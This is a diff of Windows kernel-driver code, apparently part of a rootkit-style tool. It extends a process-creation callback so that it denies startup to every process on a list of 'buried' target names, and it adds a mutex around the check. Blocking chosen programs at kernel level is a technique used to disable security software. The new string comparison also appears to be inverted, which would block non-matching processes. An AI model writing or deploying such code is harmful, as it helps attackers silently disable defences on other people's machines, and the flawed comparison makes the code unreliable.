@@ -17,22 +17,30 @@ BeBury_ProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NO
 {
     UNREFERENCED_PARAMETER(Process);
 
+    ExAcquireFastMutex(&BeGlobals::beBuryMutex);
+
     if (CreateInfo) // If new process is created ...
     {
-        // ... and its the one we want to bury ...
         DbgPrint("Process Creation %i: %wZ \r\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName);
 
-        if (!BeIsStringNull(BeGlobals::buryProcess.beBuryTargetProcessName))
+        // ... check for each process
+        for (INT i = 0; i < BeGlobals::beBuryTargetProcesses.length; ++i)
         {
-            if (wcsstr(
-                CreateInfo->ImageFileName->Buffer,
-                BeGlobals::buryProcess.beBuryTargetProcessName
-            ) != NULL) // check for substr
+            if (!BeIsStringNull(BeGlobals::beBuryTargetProcesses.array[i]))
             {
-                DbgPrint("Blocking buried process from starting. \r\n");
-                // ... then block it by setting the creation status to denied
-                CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
+                // ... if its one we want to bury ...
+                if (_strcmpi_w(
+                    CreateInfo->ImageFileName->Buffer,
+                    BeGlobals::beBuryTargetProcesses.array[i]
+                ) != NULL) 
+                {
+                    DbgPrint("Blocking buried process from starting. \r\n");
+                    // ... then block it by setting the creation status to denied
+                    CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
+                }
             }
         }
     }
+
+    ExReleaseFastMutex(&BeGlobals::beBuryMutex);
 }
